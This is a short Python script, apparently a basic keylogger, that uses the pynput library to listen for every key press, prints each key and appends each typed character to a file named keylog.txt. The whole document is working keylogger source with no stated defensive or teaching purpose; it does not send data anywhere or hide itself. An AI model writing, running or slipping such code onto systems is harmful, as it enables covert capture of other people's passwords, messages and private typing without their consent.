from pynput import keyboard

def key_pressed(key):
    print(str(key))
    try:
        char = key.char
    except AttributeError:
        print("Error retrieving character")
        return
    with open("keylog.txt", 'a') as log_file:
        log_file.write(char)

if __name__ == "__main__":
    with keyboard.Listener(on_press=key_pressed) as listener:
        listener.join()